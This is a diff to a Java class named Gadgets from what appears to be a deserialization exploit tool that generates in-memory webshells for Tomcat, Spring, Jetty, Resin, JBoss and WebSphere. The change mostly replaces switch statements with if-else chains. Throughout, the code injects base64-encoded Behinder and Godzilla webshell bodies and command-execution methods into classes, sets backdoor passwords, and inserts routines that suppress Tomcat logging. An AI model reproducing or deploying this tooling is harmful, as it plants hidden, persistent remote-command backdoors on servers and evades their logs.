@@ -19,7 +19,7 @@ import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import org.apache.commons.codec.binary.Base64;
-import org.apache.commons.lang.RandomStringUtils;
+import org.apache.commons.lang.StringUtils;
 
 
 @SuppressWarnings({
@@ -105,32 +105,20 @@ public class Gadgets {
 				command = command.substring(3);
 				packageName += "memshell.";
 				String prefix = command.substring(0, 2).toLowerCase();
-				switch (prefix) {
-					case "tf":
-					case "tl":
-					case "ts":
-					case "tw":
-					case "te":
-					case "tu":
-						packageName += "tomcat.";
-						break;
-					case "sp":
-						packageName += "spring.";
-						break;
-					case "jf":
-					case "js":
-						packageName += "jetty.";
-						break;
-					case "rf":
-					case "rs":
-						packageName += "resin.";
-						break;
-					case "jb":
-						packageName += "jboss.";
-						break;
-					case "ws":
-						packageName += "websphere.";
-						break;
+
+				if ("tf".equals(prefix) || "tl".equals(prefix) || "ts".equals(prefix) || "tw".equals(prefix) ||
+						"te".equals(prefix) || "tu".equals(prefix)) {
+					packageName += "tomcat.";
+				} else if ("sp".equals(prefix)) {
+					packageName += "spring.";
+				} else if ("jf".equals(prefix) || "js".equals(prefix)) {
+					packageName += "jetty.";
+				} else if ("rf".equals(prefix) || "rs".equals(prefix)) {
+					packageName += "resin.";
+				} else if ("jb".equals(prefix)) {
+					packageName += "jboss.";
+				} else if ("ws".equals(prefix)) {
+					packageName += "websphere.";
 				}
 
 				if (command.contains("-")) {
@@ -201,7 +189,7 @@ public class Gadgets {
 			ctClass = pool.get(className);
 
 			// 动态为 TomcatEcho 添加执行命令功能
-			if (className.contains("TomcatEcho")) {
+			if (className.contains("TomcatEcho") || className.contains("AllEcho")) {
 				insertCMD(ctClass);
 				ctClass.getDeclaredMethod("q").setBody("{return execCmd($1);}");
 
@@ -240,7 +228,7 @@ public class Gadgets {
 					insertKeyMethod(ctClass, "upgrade");
 				} else if (className.contains("EXMS")) {
 					insertKeyMethod(ctClass, "execute");
-				} else if (!Objects.equals(cName, "")) {
+				} else if (StringUtils.isNotEmpty(cName)) {
 
 					// 从 Request 中获取的内存马逻辑需要 Referer 判断
 					if (className.contains("FromRequest")) {
@@ -308,7 +296,7 @@ public class Gadgets {
 
 		// 保存内存马文件
 		if (GEN_MEM_SHELL) {
-			if (!Objects.equals(GEN_MEM_SHELL_FILENAME, "")) {
+			if (StringUtils.isNotEmpty(GEN_MEM_SHELL_FILENAME)) {
 				writeClassToFile(GEN_MEM_SHELL_FILENAME, classBytes);
 			} else {
 				writeClassToFile(ctClass.getName() + ".class", classBytes);
@@ -376,7 +364,7 @@ public class Gadgets {
 		// 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
 		String method = "";
 
-		List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
+		List<CtClass> classes = new java.util.ArrayList<CtClass>(Arrays.asList(ctClass.getInterfaces()));
 		classes.add(ctClass.getSuperclass());
 
 		for (CtClass value : classes) {
@@ -387,83 +375,67 @@ public class Gadgets {
 			}
 		}
 
-		switch (type) {
-			// 冰蝎类型的内存马
-			case "bx":
-				ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+		if ("bx".equals(type)) {
+			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
 
-				try {
-					ctClass.getDeclaredMethod("getFieldValue");
-				} catch (NotFoundException e) {
-					ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
-				}
-
-				ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
-
-				String shell = "";
-				if (isTomcat) {
-					insertTomcatNoLog(ctClass);
-					shell = IS_OBSCURE ? BEHINDER_SHELL_FOR_TOMCAT_OBSCURE : BEHINDER_SHELL_FOR_TOMCAT;
-				} else {
-					shell = IS_OBSCURE ? BEHINDER_SHELL_OBSCURE : BEHINDER_SHELL;
-				}
-
-				insertMethod(ctClass, method, base64Decode(shell).replace("f359740bd1cda994", PASSWORD).replace("https://su18.org/", REFERER));
-				break;
-			// 哥斯拉类型的内存马
-			case "gz":
-				insertField(ctClass, "payload", "Class payload ;");
-				insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");
-
-				ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
-				ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
-				ctClass.addMethod(CtMethod.make(base64Decode(MD5), ctClass));
-				ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
-				insertTomcatNoLog(ctClass);
-				insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL).replace("https://su18.org/", REFERER));
-				break;
-			// 哥斯拉 raw 类型的内存马
-			case "gzraw":
-				insertField(ctClass, "payload", "Class payload ;");
-				insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");
-
-				ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
-				insertTomcatNoLog(ctClass);
-				insertMethod(ctClass, method, base64Decode(GODZILLA_RAW_SHELL).replace("https://su18.org/", REFERER));
-				break;
-			// Tomcat Executor cmd 执行内存马
-			case "execute":
-				ctClass.addField(CtField.make("public static String TAG = \"su18\";", ctClass));
-				insertCMD(ctClass);
-				ctClass.addMethod(CtMethod.make(base64Decode(GET_REQUEST), ctClass));
-				ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
-				ctClass.addMethod(CtMethod.make(base64Decode(GET_RESPONSE), ctClass));
-
-				insertMethod(ctClass, method, base64Decode(EXECUTOR_SHELL));
-				break;
-			// websocket cmd 执行内存马
-			case "ws":
-				insertCMD(ctClass);
-				insertMethod(ctClass, method, base64Decode(WS_SHELL));
-				break;
-			case "upgrade":
+			try {
+				ctClass.getDeclaredMethod("getFieldValue");
+			} catch (NotFoundException e) {
 				ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
-				insertCMD(ctClass);
-				insertMethod(ctClass, method, base64Decode(UPGRADE_SHELL));
-				break;
-			// 命令执行回显内存马
-			case "cmd":
-			default:
-				insertCMD(ctClass);
+			}
 
-				if (isTomcat) {
-					insertTomcatNoLog(ctClass);
-					insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_TOMCAT).replace("https://su18.org/", REFERER));
-				} else {
-					insertMethod(ctClass, method, base64Decode(CMD_SHELL).replace("https://su18.org/", REFERER));
-				}
+			ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
 
-				break;
+			String shell = "";
+			if (isTomcat) {
+				insertTomcatNoLog(ctClass);
+				shell = IS_OBSCURE ? BEHINDER_SHELL_FOR_TOMCAT_OBSCURE : BEHINDER_SHELL_FOR_TOMCAT;
+			} else {
+				shell = IS_OBSCURE ? BEHINDER_SHELL_OBSCURE : BEHINDER_SHELL;
+			}
+
+			insertMethod(ctClass, method, base64Decode(shell).replace("f359740bd1cda994", PASSWORD).replace("https://su18.org/", REFERER));
+		} else if ("gz".equals(type)) {
+			insertField(ctClass, "payload", "Class payload ;");
+			insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");
+
+			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(MD5), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
+			insertTomcatNoLog(ctClass);
+			insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL).replace("https://su18.org/", REFERER));
+		} else if ("gzraw".equals(type)) {
+			insertField(ctClass, "payload", "Class payload ;");
+			insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");
+
+			ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
+			insertTomcatNoLog(ctClass);
+			insertMethod(ctClass, method, base64Decode(GODZILLA_RAW_SHELL).replace("https://su18.org/", REFERER));
+		} else if ("execute".equals(type)) {
+			ctClass.addField(CtField.make("public static String TAG = \"su18\";", ctClass));
+			insertCMD(ctClass);
+			ctClass.addMethod(CtMethod.make(base64Decode(GET_REQUEST), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(GET_RESPONSE), ctClass));
+
+			insertMethod(ctClass, method, base64Decode(EXECUTOR_SHELL));
+		} else if ("ws".equals(type)) {
+			insertCMD(ctClass);
+			insertMethod(ctClass, method, base64Decode(WS_SHELL));
+		} else if ("upgrade".equals(type)) {
+			ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
+			insertCMD(ctClass);
+			insertMethod(ctClass, method, base64Decode(UPGRADE_SHELL));
+		} else {
+			insertCMD(ctClass);
+
+			if (isTomcat) {
+				insertTomcatNoLog(ctClass);
+				insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_TOMCAT).replace("https://su18.org/", REFERER));
+			} else {
+				insertMethod(ctClass, method, base64Decode(CMD_SHELL).replace("https://su18.org/", REFERER));
+			}
 		}
 
 		ctClass.setName(generateClassName());
